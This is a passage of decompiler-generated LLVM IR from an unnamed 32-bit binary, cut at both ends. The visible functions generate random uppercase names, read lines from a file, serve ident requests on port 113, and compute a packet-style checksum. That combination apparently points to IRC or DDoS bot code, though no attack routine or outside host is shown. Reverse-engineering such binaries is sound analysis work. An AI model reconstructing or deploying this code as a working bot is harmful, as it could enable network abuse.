  %v3_10000558 = icmp eq i32 %v0_10000548, 0
  br i1 %v3_10000558, label %dec_label_pc_10000560, label %dec_label_pc_1000056c

dec_label_pc_10000560:                            ; preds = %dec_label_pc_10000548
  br label %dec_label_pc_1000064c

dec_label_pc_1000056c:                            ; preds = %dec_label_pc_10000548
  %v3_10000570 = load i32, i32* @global_var_10010468.13, align 4
  %v1_10000574 = add i32 %v3_10000570, 1
  store i32 %v1_10000574, i32* @global_var_10010468.13, align 4
  %v1_10000588 = mul i32 %v1_10000574, 4
  %v1_1000058c = add i32 %v1_10000588, 4
  store i32 268436888, i32* @lr, align 4
  %v1_10000594 = call i32 @function_10007cf0(i32 %v1_1000058c)
  %v3_100005f02 = load i32, i32* @global_var_10010468.13, align 4
  %v3_100005fc4 = icmp eq i32 %v3_100005f02, 1
  br i1 %v3_100005fc4, label %dec_label_pc_10000604, label %dec_label_pc_100005ac

dec_label_pc_100005ac:                            ; preds = %dec_label_pc_1000056c, %dec_label_pc_100005ac
  %storemerge16 = phi i32 [ %v1_100005e4, %dec_label_pc_100005ac ], [ 0, %dec_label_pc_1000056c ]
  %v1_100005b0 = mul i32 %storemerge16, 4
  %v2_100005bc = add i32 %v1_100005b0, %v1_10000594
  %v3_100005d0 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_100005d4 = add i32 %v3_100005d0, %v1_100005b0
  %v1_100005d8 = inttoptr i32 %v2_100005d4 to i32*
  %v2_100005d8 = load i32, i32* %v1_100005d8, align 4
  %v2_100005dc = inttoptr i32 %v2_100005bc to i32*
  store i32 %v2_100005d8, i32* %v2_100005dc, align 4
  %v1_100005e4 = add i32 %storemerge16, 1
  %v3_100005f0 = load i32, i32* @global_var_10010468.13, align 4
  %v1_100005f4 = add i32 %v3_100005f0, -1
  %v3_100005fc = icmp ugt i32 %v1_100005f4, %v1_100005e4
  br i1 %v3_100005fc, label %dec_label_pc_100005ac, label %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge

dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge: ; preds = %dec_label_pc_100005ac
  br label %dec_label_pc_10000604

dec_label_pc_10000604:                            ; preds = %dec_label_pc_1000056c, %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge
  %v3_10000608 = phi i32 [ %v3_100005f0, %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge ], [ %v3_100005f02, %dec_label_pc_1000056c ]
  %v1_1000060c = mul i32 %v3_10000608, 4
  %v2_10000618 = add i32 %v1_10000594, -4
  %v1_1000061c = add i32 %v2_10000618, %v1_1000060c
  %v2_10000624 = inttoptr i32 %v1_1000061c to i32*
  store i32 %v0_10000548, i32* %v2_10000624, align 4
  %v3_1000062c = load i32, i32* @global_var_1001048c.14, align 4
  store i32 268437048, i32* @lr, align 4
  %v1_10000634 = call i32 @function_10007e48(i32 %v3_1000062c)
  store i32 %v1_10000594, i32* @global_var_1001048c.14, align 4
  br label %dec_label_pc_1000064c

dec_label_pc_1000064c:                            ; preds = %dec_label_pc_10000560, %dec_label_pc_1000051c, %dec_label_pc_10000604
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_1000051c ], [ 0, %dec_label_pc_10000560 ], [ %v0_10000548, %dec_label_pc_10000604 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %v1_100005e4, { 1, 0 }
  uselistorder i32 %v1_100005b0, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v3_100005f02, { 1, 0 }
  uselistorder i32 %v1_10000594, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000064c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000604, { 1, 0 }
  uselistorder label %dec_label_pc_100005ac, { 1, 0 }
}

define i32 @function_1000066c() local_unnamed_addr {
dec_label_pc_1000066c:
  %v3_10000684 = load i8*, i8** @global_var_10010460.15, align 4
  %v4_10000684 = ptrtoint i8* %v3_10000684 to i32
  %v3_10000688 = icmp eq i8* %v3_10000684, null
  br i1 %v3_10000688, label %dec_label_pc_10000690, label %dec_label_pc_100006a0

dec_label_pc_10000690:                            ; preds = %dec_label_pc_1000066c
  store i32 268437140, i32* @lr, align 4
  %v0_10000690 = call i32 @function_1000815c()
  br label %dec_label_pc_10000704

dec_label_pc_100006a0:                            ; preds = %dec_label_pc_1000066c
  %v3_100006a4 = load i32, i32* @global_var_10010464.16, align 4
  %v3_100006a8 = icmp eq i32 %v3_100006a4, 1
  br i1 %v3_100006a8, label %dec_label_pc_100006b0, label %dec_label_pc_100006c8

dec_label_pc_100006b0:                            ; preds = %dec_label_pc_100006a0
  store i32 %v4_10000684, i32* @r3, align 4
  %v3_100006bc = call i32 @function_10007638(i32 %v4_10000684, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10000704

dec_label_pc_100006c8:                            ; preds = %dec_label_pc_100006a0
  store i32 268437196, i32* @lr, align 4
  %v0_100006c8 = call i32 @function_1000815c()
  %v3_100006d8 = load i32, i32* @global_var_10010464.16, align 4
  %v2_100006dc = urem i32 %v0_100006c8, %v3_100006d8
  %v3_100006ec = load i8*, i8** @global_var_10010460.15, align 4
  %v4_100006ec = ptrtoint i8* %v3_100006ec to i32
  %v2_100006f0 = add i32 %v4_100006ec, %v2_100006dc
  %v1_100006f4 = add i32 %v2_100006f0, 1
  store i32 %v1_100006f4, i32* @r3, align 4
  %v2_100006fc = call i32 @function_10007638(i32 %v1_100006f4, i32 %v2_100006f0)
  br label %dec_label_pc_10000704

dec_label_pc_10000704:                            ; preds = %dec_label_pc_100006b0, %dec_label_pc_10000690, %dec_label_pc_100006c8
  %stack_var_-24.0 = phi i32 [ %v0_10000690, %dec_label_pc_10000690 ], [ %v3_100006bc, %dec_label_pc_100006b0 ], [ %v2_100006fc, %dec_label_pc_100006c8 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_10000684, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_10007638, { 1, 0 }
  uselistorder label %dec_label_pc_10000704, { 2, 0, 1 }
}

define i32 @function_10000724(i32 %arg1) local_unnamed_addr {
dec_label_pc_10000724:
  %v2_10000778 = add i32 %arg1, -1
  br label %dec_label_pc_10000764

dec_label_pc_10000740:                            ; preds = %dec_label_pc_10000790, %dec_label_pc_10000764
  store i32 %arg1, i32* @r3, align 4
  %v0_10000744 = call i32 @function_10006ed8()
  %v1_10000758 = add i32 %v0_10000744, %v2_10000778
  %v3_10000760 = inttoptr i32 %v1_10000758 to i8*
  store i8 0, i8* %v3_10000760, align 1
  br label %dec_label_pc_10000764

dec_label_pc_10000764:                            ; preds = %dec_label_pc_10000724, %dec_label_pc_10000740
  store i32 %arg1, i32* @r3, align 4
  %v0_10000768 = call i32 @function_10006ed8()
  %v1_1000077c = add i32 %v0_10000768, %v2_10000778
  %v1_10000780 = inttoptr i32 %v1_1000077c to i8*
  %v2_10000780 = load i8, i8* %v1_10000780, align 1
  %v3_10000788 = icmp eq i8 %v2_10000780, 13
  br i1 %v3_10000788, label %dec_label_pc_10000740, label %dec_label_pc_10000790

dec_label_pc_10000790:                            ; preds = %dec_label_pc_10000764
  store i32 %arg1, i32* @r3, align 4
  %v0_10000794 = call i32 @function_10006ed8()
  %v1_100007a8 = add i32 %v0_10000794, %v2_10000778
  %v1_100007ac = inttoptr i32 %v1_100007a8 to i8*
  %v2_100007ac = load i8, i8* %v1_100007ac, align 1
  %v3_100007b4 = icmp eq i8 %v2_100007ac, 10
  br i1 %v3_100007b4, label %dec_label_pc_10000740, label %dec_label_pc_100007bc

dec_label_pc_100007bc:                            ; preds = %dec_label_pc_10000790
  ret i32 %v0_10000794

; uselistorder directives
  uselistorder i32 %arg1, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10000764, { 1, 0 }
}

define i32 @function_100007d4() local_unnamed_addr {
dec_label_pc_100007d4:
  %stack_var_-1076 = alloca i32, align 4
  store i32 268437488, i32* @lr, align 4
  %v0_100007ec = call i32 @function_1000815c()
  %v2_10000808 = srem i32 %v0_100007ec, 5
  %v1_10000824 = add nsw i32 %v2_10000808, 4
  %v1_10000830 = add nsw i32 %v2_10000808, 5
  store i32 268437564, i32* @lr, align 4
  %v1_10000838 = call i32 @function_10007cf0(i32 %v1_10000830)
  store i32 268437604, i32* @lr, align 4
  %v3_10000860 = call i32 @function_10006e28(i32 %v1_10000838, i32 0, i32 %v1_10000830)
  store i32 268437624, i32* @lr, align 4
  %v3_10000874 = call i32 @function_10004ca0(i32 ptrtoint ([16 x i8]* @global_var_1000ce90.17 to i32), i32 ptrtoint (i32* @global_var_1000cea0.18 to i32))
  %v3_10000884 = icmp eq i32 %v3_10000874, 0
  br i1 %v3_10000884, label %dec_label_pc_100008fc.preheader, label %dec_label_pc_10000910

dec_label_pc_100008fc.preheader:                  ; preds = %dec_label_pc_100007d4
  %v2_100009048 = icmp sgt i32 %v2_10000808, -4
  br i1 %v2_100009048, label %dec_label_pc_10000898, label %dec_label_pc_10000a00

dec_label_pc_10000898:                            ; preds = %dec_label_pc_100008fc.preheader, %dec_label_pc_10000898
  %storemerge711 = phi i32 [ %v1_100008f4, %dec_label_pc_10000898 ], [ 0, %dec_label_pc_100008fc.preheader ]
  store i32 268437676, i32* @lr, align 4
  %v0_100008a8 = call i32 @function_1000815c()
  %v2_100008c4 = srem i32 %v0_100008a8, 26
  %fold = add nsw i32 %v2_100008c4, 65
  %v1_100008ec = trunc i32 %fold to i8
  %v2_100008ec = load i32, i32* @r29, align 4
  %v3_100008ec = inttoptr i32 %v2_100008ec to i8*
  store i8 %v1_100008ec, i8* %v3_100008ec, align 1
  %v1_100008f4 = add nuw nsw i32 %storemerge711, 1
  %v2_10000904 = icmp slt i32 %v1_100008f4, %v1_10000824
  br i1 %v2_10000904, label %dec_label_pc_10000898, label %dec_label_pc_10000a00

dec_label_pc_10000910:                            ; preds = %dec_label_pc_100007d4
  store i32 268437780, i32* @lr, align 4
  %v0_10000910 = call i32 @function_1000815c()
  store i32 268437788, i32* @lr, align 4
  %v0_10000918 = call i32 @function_1000815c()
  %v0_10000920 = load i32, i32* @r29, align 4
  %v2_10000920 = mul i32 %v0_10000920, %v0_10000918
  %v2_1000093c = srem i32 %v2_10000920, 45402
  %v2_1000099c12 = icmp sgt i32 %v2_1000093c, -1
  %v2_10000974 = ptrtoint i32* %stack_var_-1076 to i32
  br i1 %v2_1000099c12, label %dec_label_pc_10000974, label %dec_label_pc_100009a4

dec_label_pc_10000974:                            ; preds = %dec_label_pc_10000910, %dec_label_pc_10000974
  %storemerge615 = phi i32 [ %v1_1000098c, %dec_label_pc_10000974 ], [ 0, %dec_label_pc_10000910 ]
  store i32 268437896, i32* @lr, align 4
  %v3_10000984 = call i32 @function_10006660(i32 %v2_10000974, i32 1024, i32 %v3_10000874)
  %v1_1000098c = add nuw nsw i32 %storemerge615, 1
  %v2_1000099c = icmp slt i32 %storemerge615, %v2_1000093c
  br i1 %v2_1000099c, label %dec_label_pc_10000974, label %dec_label_pc_100009a4

dec_label_pc_100009a4:                            ; preds = %dec_label_pc_10000974, %dec_label_pc_10000910
  store i32 268437948, i32* @lr, align 4
  %v3_100009b8 = call i32 @function_10006e28(i32 %v2_10000974, i32 0, i32 1024)
  store i32 268437968, i32* @lr, align 4
  %v3_100009cc = call i32 @function_10006660(i32 %v2_10000974, i32 1024, i32 %v3_10000874)
  store i32 268437980, i32* @lr, align 4
  %v1_100009d8 = call i32 @function_10000724(i32 %v2_10000974)
  store i32 %v1_10000838, i32* @r3, align 4
  store i32 %v2_10000974, i32* @r4, align 4
  store i32 %v1_10000824, i32* @r5, align 4
  store i32 268438008, i32* @lr, align 4
  %v0_100009f4 = call i32 @function_10006d8c()
  store i32 268438016, i32* @lr, align 4
  %v1_100009fc = inttoptr i32 %v3_10000874 to i16*
  %v2_100009fc = call i32 @function_10004b54(i16* %v1_100009fc)
  br label %dec_label_pc_10000a00

dec_label_pc_10000a00:                            ; preds = %dec_label_pc_10000898, %dec_label_pc_100008fc.preheader, %dec_label_pc_100009a4
  ret i32 %v1_10000838

; uselistorder directives
  uselistorder i32 %v1_100008f4, { 1, 0 }
  uselistorder i32 %v1_10000838, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000a00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000974, { 1, 0 }
  uselistorder label %dec_label_pc_10000898, { 1, 0 }
}

define i32 @function_10000a24() local_unnamed_addr {
dec_label_pc_10000a24:
  %stack_var_-1180 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-1240 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-1216 = alloca i32, align 4
  %stack_var_-1196 = alloca i32, align 4
  %stack_var_-1204 = alloca i32, align 4
  %stack_var_-1212 = alloca i32, align 4
  store i32 268438088, i32* @lr, align 4
  %v3_10000a44 = call i32 @function_10007cbc(i32 2, i32 1, i32 0)
  %v4_10000a58 = icmp eq i32 %v3_10000a44, -1
  br i1 %v4_10000a58, label %dec_label_pc_10000d80, label %dec_label_pc_10000a60

dec_label_pc_10000a60:                            ; preds = %dec_label_pc_10000a24
  store i32 2, i32* %stack_var_-1212, align 4
  store i32 113, i32* @r3, align 4
  %v1_10000a6c = call i32 @function_10007644(i32 113)
  %v2_10000a80 = ptrtoint i32* %stack_var_-1212 to i32
  %v2_10000a84 = ptrtoint i32* %stack_var_-1204 to i32
  store i32 0, i32* %stack_var_-1204, align 4
  store i32 268438188, i32* @lr, align 4
  %v4_10000aa8 = call i32 @function_10007b70(i32 %v3_10000a44, i32 %v2_10000a80, i32 16, i32 %v2_10000a84)
  %v4_10000ab4 = icmp eq i32 %v4_10000aa8, -1
  br i1 %v4_10000ab4, label %dec_label_pc_10000d80, label %dec_label_pc_10000abc

dec_label_pc_10000abc:                            ; preds = %dec_label_pc_10000a60
  store i32 268438216, i32* @lr, align 4
  %v3_10000ac4 = call i32 @function_10007bd8(i32 %v3_10000a44, i32 1, i32 %v4_10000aa8)
  %v4_10000ad0 = icmp eq i32 %v3_10000ac4, -1
  br i1 %v4_10000ad0, label %dec_label_pc_10000d80, label %dec_label_pc_10000ad8

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000abc
  store i32 268438236, i32* @lr, align 4
  %v0_10000ad8 = call i32 @function_10004928()
  %v3_10000ae0 = icmp eq i32 %v0_10000ad8, 0
  br i1 %v3_10000ae0, label %dec_label_pc_10000d80, label %dec_label_pc_10000ae8

dec_label_pc_10000ae8:                            ; preds = %dec_label_pc_10000ad8
  store i32 16, i32* %stack_var_-1216, align 4
  %v2_10000af0 = ptrtoint i32* %stack_var_-1196 to i32
  %v2_10000af4 = ptrtoint i32* %stack_var_-1216 to i32
  store i32 268438280, i32* @lr, align 4
  %v4_10000b04 = call i32 @function_10007b3c(i32 %v3_10000a44, i32 %v2_10000af0, i32 %v2_10000af4, i32 %v2_10000af4)
  %v4_10000b18 = icmp eq i32 %v4_10000b04, -1
  br i1 %v4_10000b18, label %dec_label_pc_10000b20, label %dec_label_pc_10000b28.preheader

dec_label_pc_10000b20:                            ; preds = %dec_label_pc_10000ae8
  %v0_10000b24 = call i32 @function_1000885c()
  br label %dec_label_pc_10000b28.preheader

dec_label_pc_10000b28.preheader:                  ; preds = %dec_label_pc_10000b20, %dec_label_pc_10000ae8
  %v2_10000b28 = ptrtoint i32* %stack_var_-148 to i32
  %v1_10000b70 = udiv i32 %v4_10000b04, 32
  %v1_10000b78 = mul nuw nsw i32 %v1_10000b70, 4
  %v2_10000b7c = ptrtoint i32* %stack_var_-1240 to i32
  %v2_10000b80 = add i32 %v2_10000b7c, 1092
  %v1_10000b84 = add i32 %v2_10000b80, %v1_10000b78
  %v1_10000b88 = inttoptr i32 %v1_10000b84 to i32*
  %v1_10000b90 = urem i32 %v4_10000b04, 32
  %v3_10000b98 = shl i32 1, %v1_10000b90
  %v1_10000bc8 = add i32 %v4_10000b04, 1
  %v2_10000bd0 = ptrtoint i32* %stack_var_-156 to i32
  %v3_10000c24 = sub i32 0, %v4_10000b04
  %v4_10000c24 = urem i32 %v3_10000c24, 32
  %v6_10000c24 = xor i32 %v4_10000c24, 31
  %v12_10000c24 = lshr i32 -1, %v1_10000b90
  %v16_10000c24 = xor i32 %v12_10000c24, 1
  %v14_10000c24 = urem i32 %v12_10000c24, 2
  br label %dec_label_pc_10000b28

dec_label_pc_10000b28:                            ; preds = %dec_label_pc_10000b28.preheader, %dec_label_pc_10000c00
  store i32 %v2_10000b28, i32* %stack_var_-1240, align 4
  store i32 0, i32* %stack_var_-148, align 4
  br label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge

dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge: ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge, %dec_label_pc_10000b28
  %v3_10000b40.pre = phi i32 [ %v2_10000b28, %dec_label_pc_10000b28 ], [ %v3_10000b40.pre.pre, %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge ]
  %v1_10000b5830 = phi i32 [ 1, %dec_label_pc_10000b28 ], [ %v1_10000b58, %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge ]
  %v1_10000b44 = mul nuw nsw i32 %v1_10000b5830, 4
  %v2_10000b48 = add i32 %v1_10000b44, %v3_10000b40.pre
  %v2_10000b50 = inttoptr i32 %v2_10000b48 to i32*
  store i32 0, i32* %v2_10000b50, align 4
  %v1_10000b58 = add nuw nsw i32 %v1_10000b5830, 1
  %tmp25 = icmp ult i32 %v1_10000b58, 32
  br i1 %tmp25, label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge, label %dec_label_pc_10000b6c

dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge: ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge
  %v3_10000b40.pre.pre = load i32, i32* %stack_var_-1240, align 4
  br label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge

dec_label_pc_10000b6c:                            ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge
  %v2_10000b88 = load i32, i32* %v1_10000b88, align 4
  %v2_10000b9c = or i32 %v2_10000b88, %v3_10000b98
  store i32 %v2_10000b9c, i32* %v1_10000b88, align 4
  store i32 60, i32* %stack_var_-156, align 4
  store i32 268438508, i32* @lr, align 4
  %v6_10000be8 = call i32 @function_10004a48(i32 %v1_10000bc8, i32 %v2_10000b28, i32 0, i32 0, i32 %v2_10000bd0, i32 %v2_10000b28)
  %tmp26 = icmp sgt i32 %v6_10000be8, -1
  br i1 %tmp26, label %dec_label_pc_10000c00, label %dec_label_pc_10000bf8

dec_label_pc_10000bf8:                            ; preds = %dec_label_pc_10000b6c
  %v0_10000bfc = call i32 @function_1000885c()
  br label %dec_label_pc_10000c00

dec_label_pc_10000c00:                            ; preds = %dec_label_pc_10000b6c, %dec_label_pc_10000bf8
  %v2_10000c18 = load i32, i32* %v1_10000b88, align 4
  %v5_10000c24 = shl i32 %v2_10000c18, %v4_10000c24
  %v7_10000c24 = lshr i32 %v2_10000c18, %v6_10000c24
  %v8_10000c24 = udiv i32 %v7_10000c24, 2
  %v9_10000c24 = or i32 %v8_10000c24, %v5_10000c24
  %tmp = icmp slt i32 %v2_10000c18, 0
  %v15_10000c242 = zext i1 %tmp to i32
  %v17_10000c24 = and i32 %v15_10000c242, %v16_10000c24
  %v14_10000c24.masked = and i32 %v14_10000c24, %v9_10000c24
  %v1_10000c2c = or i32 %v14_10000c24.masked, %v17_10000c24
  %v3_10000c30 = icmp eq i32 %v1_10000c2c, 0
  br i1 %v3_10000c30, label %dec_label_pc_10000b28, label %dec_label_pc_10000c3c

dec_label_pc_10000c3c:                            ; preds = %dec_label_pc_10000c00
  %v2_10000c3c = ptrtoint i32* %stack_var_-1180 to i32
  store i32 268438612, i32* @lr, align 4
  %v4_10000c50 = call i32 @function_10007c08(i32 %v4_10000b04, i32 %v2_10000c3c, i32 1024, i32 0)
  %tmp27 = icmp slt i32 %v4_10000c50, 1
  br i1 %tmp27, label %dec_label_pc_10000c74, label %dec_label_pc_10000c68

dec_label_pc_10000c68:                            ; preds = %dec_label_pc_10000c3c
  %tmp28 = icmp slt i32 %v4_10000c50, 20
  br i1 %tmp28, label %dec_label_pc_10000c7c, label %dec_label_pc_10000c74

dec_label_pc_10000c74:                            ; preds = %dec_label_pc_10000c68, %dec_label_pc_10000c3c
  %v0_10000c78 = call i32 @function_1000885c()
  br label %dec_label_pc_10000c7c

dec_label_pc_10000c7c:                            ; preds = %dec_label_pc_10000c68, %dec_label_pc_10000c74
  %v2_10000c84 = add i32 %v2_10000b7c, 60
  %v3_10000c8c = add i32 %v2_10000c84, %v4_10000c50
  %v4_10000c8c = inttoptr i32 %v3_10000c8c to i8*
  store i8 0, i8* %v4_10000c8c, align 1
  %v1_10000c94 = add i32 %v2_10000b7c, -1
  %v2_10000c9c = add i32 %v1_10000c94, %v4_10000c50
  %v1_10000ca0 = add i32 %v2_10000c9c, 60
  %v2_10000ca0 = inttoptr i32 %v1_10000ca0 to i8*
  %v3_10000ca0 = load i8, i8* %v2_10000ca0, align 1
  %v3_10000ca8 = icmp eq i8 %v3_10000ca0, 10
  br i1 %v3_10000ca8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000cb0

dec_label_pc_10000cb0:                            ; preds = %dec_label_pc_10000c7c
  %v3_10000cc0 = load i8, i8* %v2_10000ca0, align 1
  %v3_10000cc8 = icmp eq i8 %v3_10000cc0, 13
  br i1 %v3_10000cc8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000ce8

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000cb0, %dec_label_pc_10000c7c
  store i8 0, i8* %v2_10000ca0, align 1
  br label %dec_label_pc_10000ce8

dec_label_pc_10000ce8:                            ; preds = %dec_label_pc_10000cb0, %dec_label_pc_10000cd0
  %v1_10000cec = add i32 %v2_10000b7c, -2
  %v2_10000cf4 = add i32 %v1_10000cec, %v4_10000c50
  %v1_10000cf8 = add i32 %v2_10000cf4, 60
  %v2_10000cf8 = inttoptr i32 %v1_10000cf8 to i8*
  %v3_10000cf8 = load i8, i8* %v2_10000cf8, align 1
  %v3_10000d00 = icmp eq i8 %v3_10000cf8, 10
  br i1 %v3_10000d00, label %dec_label_pc_10000d28, label %dec_label_pc_10000d08

dec_label_pc_10000d08:                            ; preds = %dec_label_pc_10000ce8
  %v3_10000d18 = load i8, i8* %v2_10000cf8, align 1
  %v3_10000d20 = icmp eq i8 %v3_10000d18, 13
  br i1 %v3_10000d20, label %dec_label_pc_10000d28, label %dec_label_pc_10000d40

dec_label_pc_10000d28:                            ; preds = %dec_label_pc_10000d08, %dec_label_pc_10000ce8
  store i8 0, i8* %v2_10000cf8, align 1
  br label %dec_label_pc_10000d40

dec_label_pc_10000d40:                            ; preds = %dec_label_pc_10000d08, %dec_label_pc_10000d28
  %v3_10000d44 = load i32, i32* @global_var_10010470.19, align 4
  %v6_10000d64 = call i32 @function_1000041c(i32 %v4_10000b04, i32 ptrtoint ([25 x i8]* @global_var_1000cea4.20 to i32), i32 %v2_10000c3c, i32 %v3_10000d44)
  store i32 268438896, i32* @lr, align 4
  %v1_10000d6c = call i32 @function_100048e0(i32 %v4_10000b04)
  store i32 ptrtoint ([3 x i8]* @global_var_10000d78.21 to i32), i32* @lr, align 4
  %v1_10000d74 = call i32 @function_100048e0(i32 %v3_10000a44)
  %v0_10000d7c = call i32 @function_1000885c()
  br label %dec_label_pc_10000d80

dec_label_pc_10000d80:                            ; preds = %dec_label_pc_10000ad8, %dec_label_pc_10000abc, %dec_label_pc_10000a60, %dec_label_pc_10000a24, %dec_label_pc_10000d40
  %v0_10000d94 = phi i32 [ 0, %dec_label_pc_10000ad8 ], [ -1, %dec_label_pc_10000abc ], [ -1, %dec_label_pc_10000a60 ], [ -1, %dec_label_pc_10000a24 ], [ %v0_10000d7c, %dec_label_pc_10000d40 ]
  ret i32 %v0_10000d94

; uselistorder directives
  uselistorder i8* %v2_10000cf8, { 1, 0, 2 }
  uselistorder i8* %v2_10000ca0, { 1, 0, 2 }
  uselistorder i32 %v4_10000c50, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_10000c18, { 0, 2, 1 }
  uselistorder i32 %v1_10000b58, { 1, 0 }
  uselistorder i32 %v1_10000b90, { 1, 0 }
  uselistorder i32* %v1_10000b88, { 1, 0, 2 }
  uselistorder i32 %v2_10000b28, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10000b04, { 2, 3, 4, 5, 6, 1, 0, 7 }
  uselistorder i32* %stack_var_-1212, { 1, 0 }
  uselistorder i32* %stack_var_-1216, { 1, 0 }
  uselistorder label %dec_label_pc_10000d80, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10000d40, { 1, 0 }
  uselistorder label %dec_label_pc_10000ce8, { 1, 0 }
  uselistorder label %dec_label_pc_10000c7c, { 1, 0 }
  uselistorder label %dec_label_pc_10000c00, { 1, 0 }
  uselistorder label %dec_label_pc_10000b28, { 1, 0 }
}

define i32 @function_10000d98(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10000d98:
  %v3_10000db8 = icmp eq i32 %arg2, 0
  br i1 %v3_10000db8, label %dec_label_pc_10000dc0, label %dec_label_pc_10000dcc

dec_label_pc_10000dc0:                            ; preds = %dec_label_pc_10000d98
  br label %dec_label_pc_10000e08

dec_label_pc_10000dcc:                            ; preds = %dec_label_pc_10000d98
  %v3_10000dd0 = icmp eq i32 %arg2, 1
  br i1 %v3_10000dd0, label %dec_label_pc_10000dd8, label %dec_label_pc_10000de4

dec_label_pc_10000dd8:                            ; preds = %dec_label_pc_10000dcc
  br label %dec_label_pc_10000e08

dec_label_pc_10000de4:                            ; preds = %dec_label_pc_10000dcc
  %v1_10000de8 = add i32 %arg2, -1
  %v2_10000df4 = call i32 @function_10000d98(i32 %arg1, i32 %v1_10000de8)
  %v2_10000e00 = mul i32 %v2_10000df4, %arg1
  br label %dec_label_pc_10000e08

dec_label_pc_10000e08:                            ; preds = %dec_label_pc_10000dd8, %dec_label_pc_10000dc0, %dec_label_pc_10000de4
  %stack_var_-16.0 = phi i32 [ 1, %dec_label_pc_10000dc0 ], [ %arg1, %dec_label_pc_10000dd8 ], [ %v2_10000e00, %dec_label_pc_10000de4 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000e08, { 2, 0, 1 }
}

define i32 @function_10000e28(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10000e28:
  %v2_10000e944 = icmp sgt i32 %arg2, 1
  br i1 %v2_10000e944, label %dec_label_pc_10000e60, label %dec_label_pc_10000e9c

dec_label_pc_10000e60:                            ; preds = %dec_label_pc_10000e28, %dec_label_pc_10000e60
  %stack_var_-24.08 = phi i32 [ %v1_10000e88, %dec_label_pc_10000e60 ], [ %arg2, %dec_label_pc_10000e28 ]
  %stack_var_-28.07 = phi i16* [ %v5_10000e80, %dec_label_pc_10000e60 ], [ %arg1, %dec_label_pc_10000e28 ]
  %stack_var_-32.06 = phi i32 [ %v2_10000e70, %dec_label_pc_10000e60 ], [ 0, %dec_label_pc_10000e28 ]
  %v4_10000e60 = ptrtoint i16* %stack_var_-28.07 to i32
  %v2_10000e64 = load i16, i16* %stack_var_-28.07, align 2
  %v3_10000e64 = zext i16 %v2_10000e64 to i32
  %v2_10000e70 = add i32 %v3_10000e64, %stack_var_-32.06
  %v1_10000e7c = add i32 %v4_10000e60, 2
  %v5_10000e80 = inttoptr i32 %v1_10000e7c to i16*
  %v1_10000e88 = add nsw i32 %stack_var_-24.08, -2
  %v2_10000e94 = icmp sgt i32 %v1_10000e88, 1
  br i1 %v2_10000e94, label %dec_label_pc_10000e60, label %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge

dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge: ; preds = %dec_label_pc_10000e60
  %v3_10000e94.le = icmp eq i32 %v1_10000e88, 1
  br i1 %v3_10000e94.le, label %dec_label_pc_10000ea8, label %dec_label_pc_10000ed0

dec_label_pc_10000e9c:                            ; preds = %dec_label_pc_10000e28
  %v3_10000e945 = icmp eq i32 %arg2, 1
  br i1 %v3_10000e945, label %dec_label_pc_10000ea8, label %dec_label_pc_10000ed0

dec_label_pc_10000ea8:                            ; preds = %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge, %dec_label_pc_10000e9c
  %stack_var_-28.0.lcssa16 = phi i16* [ %v5_10000e80, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ], [ %arg1, %dec_label_pc_10000e9c ]
  %stack_var_-32.0.lcssa15 = phi i32 [ %v2_10000e70, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ], [ 0, %dec_label_pc_10000e9c ]
  %v1_10000eb0 = bitcast i16* %stack_var_-28.0.lcssa16 to i8*
  %v2_10000eb0 = load i8, i8* %v1_10000eb0, align 1
  %v3_10000eb0 = zext i8 %v2_10000eb0 to i32
  %v2_10000ec8 = add i32 %v3_10000eb0, %stack_var_-32.0.lcssa15
  br label %dec_label_pc_10000ed0

